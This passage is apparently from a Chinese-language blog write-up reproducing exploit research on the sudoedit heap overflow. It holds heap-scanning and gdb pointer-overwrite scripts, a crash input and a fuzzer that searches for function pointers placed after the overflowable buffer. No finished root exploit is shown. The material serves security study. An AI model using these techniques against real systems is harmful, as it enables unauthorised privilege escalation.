0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span></span><br><span class="line"><span class="string">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span></span><br><span class="line"><span class="string">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">memmap = []</span><br><span class="line"><span class="keyword">for</span> mem <span class="keyword">in</span> vmmap.splitlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;r-x&#x27;</span> <span class="keyword">in</span> mem:</span><br><span class="line">        start, end, size, perm, f = mem.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        start = <span class="built_in">int</span>(start, <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(end, <span class="number">16</span>)</span><br><span class="line">        memmap.append((start, end))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/pwd/heap&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    heap = f.read()</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>得到结果</p><p><img src="https://img.joe1sn.top/uploads/big/449bbaa76e8ed77743a08a0c31acb492.png" alt="image-20220414092034283" /></p><p>能堆溢出的堆在最下面，不能覆写任何函数指针，艹</p></li><li><p>重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure><p>生成不会造成<code>crash</code>的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;0edit\x00-s\x000000000&quot; &gt; /tmp/normal</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f75b0c385d066b7147fb7d12818f4fbf.png" alt="image-20220414092905786" /></p><p>在gdb中设置这些值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set *0x00005555556149a8 = 0x4141414141</span><br><span class="line">set *0x00005555556149b0 = 0x4242424242</span><br><span class="line">set *0x0000555555615260 = 0x4343434343</span><br><span class="line">set *0x0000555555615268 = 0x4444444444</span><br><span class="line">set *0x0000555555617e00 = 0x4545454545</span><br><span class="line">set *0x0000555555617eb0 = 0x4646464646</span><br><span class="line">set *0x0000555555618378 = 0x4747474747</span><br><span class="line">set *0x0000555555618398 = 0x4848484848</span><br><span class="line">set *0x00005555556183b8 = 0x4949494949</span><br><span class="line">set *0x00005555556183d8 = 0x4a4a4a4a4a</span><br><span class="line">set *0x00005555556184d8 = 0x4b4b4b4b4b</span><br><span class="line">set *0x0000555555619b40 = 0x4c4c4c4c4c</span><br><span class="line">set *0x000055555561a0b0 = 0x4d4d4d4d4d</span><br></pre></td></tr></table></figure><p>取消断点继续，应该就会出现一些报错了</p><p><img src="https://img.joe1sn.top/uploads/big/1f7019cfc44dd23bc8341b49638dfff1.png" alt="image-20220414103302900" /></p><p>&gt;&gt;问题</p><ul><li><p>没有出现报错，并且直接执行了</p><p>脚本的相关的地址写错了</p></li></ul><p>发现一个红黑树!</p><p><img src="https://img.joe1sn.top/uploads/big/d2970fcab1ca82e6035b8dc63f429930.png" alt="image-20220414103855166" /></p><p>结果看到<code>compar</code>变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖<code>compar</code>地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，<code>set *0x000055555561a0b0 = 0x4d4d4d4d4d</code>换掉，得到另一个crash</p><p><img src="https://img.joe1sn.top/uploads/big/8f92f140a02788a9be9ae451e5e482b2.png" alt="image-20220415105540238" /></p></li></ol><h1 id="强制堆分配"><a class="markdownIt-Anchor" href="#强制堆分配"></a> 强制堆分配</h1><p>在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。</p><p>核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk</p><h2 id="改写sudo源码"><a class="markdownIt-Anchor" href="#改写sudo源码"></a> 改写sudo源码</h2><p>真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo</p><ol><li><p>添加打印参数Chunk地址</p><p><img src="https://img.joe1sn.top/uploads/big/2cef5162ba6a14905755f21063a29737.png" alt="image-20220414120240051" /></p></li><li><p>已上一节的红黑树为例，打印<code>compar</code>的值</p><p><s>忘写分号了</s></p><p><img src="https://img.joe1sn.top/uploads/big/0277679ee8b79157542b7ca86679262e.png" alt="image-20220414122222094" /></p><p><img src="https://img.joe1sn.top/uploads/big/677cba2f8962fddb6943fa56da03b8d1.png" alt="image-20220414122448875" /></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br><span class="line">ln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit</span><br></pre></td></tr></table></figure><p>作者在这里踩了坑，我想复现下，不想看的可以略过</p><p><img src="https://img.joe1sn.top/uploads/big/4ecd2bb3d6b06eefcd140b1cbc096af3.png" alt="image-20220414123642675" /></p><p><img src="https://img.joe1sn.top/uploads/big/cc0e7e9154dd2ed5e98aae914cc289f4.png" alt="image-20220414123801800" /></p><p>虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，<strong>但是这个库不含有<code>printf</code>即其他输出，自然也就没法打印字符串</strong></p><p>&gt;&gt;问题</p><ul><li><p>没有反应</p><p>找找是不是代码写的文件是其他文件的代码</p></li></ul><p>所以使用<code>make install</code>安装方法就好了，只要之前make过一次之后就都可以了</p><p><img src="https://img.joe1sn.top/uploads/big/a9391826eb45d490d44f3519b94854f8.png" alt="image-20220414212057228" /></p><p>堆溢出发生时，程序并不会立即<code>crash</code>，而是会进入到红黑树的部分，但是能溢出的<code>user_args</code>地址在<code>rbtree1</code>地址后面，所以依然无法利用</p><h2 id="暴力测试脚本"><a class="markdownIt-Anchor" href="#暴力测试脚本"></a> 暴力测试脚本</h2><p>尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的</p><ol><li><p>输入来源</p><ul><li>stdin</li><li>文件(files)</li><li>协议参数(arguments)</li><li>环境变量(env vars)</li></ul></li><li><p>设置长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some common size values usable for different inputs</span></span><br><span class="line">_SIZES = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>)]</span><br><span class="line">_SIZES += [<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += ([<span class="number">0</span>]*<span class="number">50</span>)</span><br></pre></td></tr></table></figure></li><li><p>sudo参数协议(sudo help)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some flags from sudo -h</span></span><br><span class="line">ARG1 = [<span class="string">&quot;-A&quot;</span>,<span class="string">&quot;-B&quot;</span>,<span class="string">&quot;-E&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;-H&quot;</span>,<span class="string">&quot;-K&quot;</span>,<span class="string">&quot;-k&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-n&quot;</span>,<span class="string">&quot;-P&quot;</span>,<span class="string">&quot;-S&quot;</span>,<span class="string">&quot;-s&quot;</span>]</span><br><span class="line">ARG1 += [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">ARG2 = _SIZES</span><br><span class="line">ARG3 = _SIZES</span><br><span class="line">HOSTNAME = _SIZES</span><br><span class="line">ENV = _SIZES</span><br></pre></td></tr></table></figure></li><li><p>设置测试集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump a testcase into a logfile</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_file</span>(<span class="params">fname, lines, ptrs, arg, env, key</span>):</span><br><span class="line">    <span class="comment"># create the folders if they don&#x27;t exist</span></span><br><span class="line">    directory = os.path.dirname(fname)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        os.makedirs(directory)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># don&#x27;t write the dump file if it&#x27;s already too large</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(fname) <span class="keyword">and</span> Path(fname).stat().st_size &gt; <span class="number">200000</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write to file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;----------------------------\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">1</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">            f.write(<span class="string">f&quot;user_args &lt; <span class="subst">&#123;key.decode(<span class="string">&#x27;ascii&#x27;</span>)&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;distance: 0x<span class="subst">&#123;distance:x&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            f.write(<span class="string">f&quot;0x<span class="subst">&#123;ptrs[<span class="string">b&#x27;user_args&#x27;</span>]:016x&#125;</span> &lt; 0x<span class="subst">&#123;ptrs[key]:016x&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;args: sudoedit &quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot; &quot;</span>.join(arg))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> env:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;env[k]&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">0</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        test = &#123;&#125;</span><br><span class="line">        test[<span class="string">&#x27;arg&#x27;</span>] = arg</span><br><span class="line">        test[<span class="string">&#x27;env&#x27;</span>] = env</span><br><span class="line">        f.write(json.dumps(test))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">&#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>fuzz主要功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fuzz loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># select random size values</span></span><br><span class="line">    arg1 = random.choice(ARG1)</span><br><span class="line">    rand_arg2_size = random.choice(ARG2)</span><br><span class="line">    rand_arg3_size = random.choice(ARG3)</span><br><span class="line">    rand_hostname_size = random.choice(HOSTNAME)</span><br><span class="line">    rand_env_size = random.choice(ENV)</span><br><span class="line">    arg = []</span><br><span class="line">    env = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># arguments</span></span><br><span class="line">    <span class="comment"># ... -s AAAAAAA\ ...</span></span><br><span class="line">    <span class="keyword">if</span> arg1:</span><br><span class="line">        arg.append(arg1)</span><br><span class="line">    arg.append(<span class="string">&quot;-s&quot;</span>)</span><br><span class="line">    arg.append(random.choice(ALPHABET)*rand_arg2_size + <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> rand_arg3_size:</span><br><span class="line">        arg.append(random.choice(ALPHABET)*rand_arg3_size)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># environment variables</span></span><br><span class="line">    <span class="keyword">if</span> rand_hostname_size:</span><br><span class="line">        env[<span class="string">&quot;HOSTNAME&quot;</span>] = random.choice(ALPHABET)*rand_hostname_size</span><br><span class="line">    <span class="keyword">if</span> rand_env_size:</span><br><span class="line">        env[random.choice(ALPHABET)*<span class="number">3</span>] = random.choice(ALPHABET)*rand_env_size</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># run sudoedit</span></span><br><span class="line">    run_sudoedit(arg, env)</span><br></pre></td></tr></table></figure></li><li><p>开始fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br></pre></td></tr></table></figure></li></ol><p><img 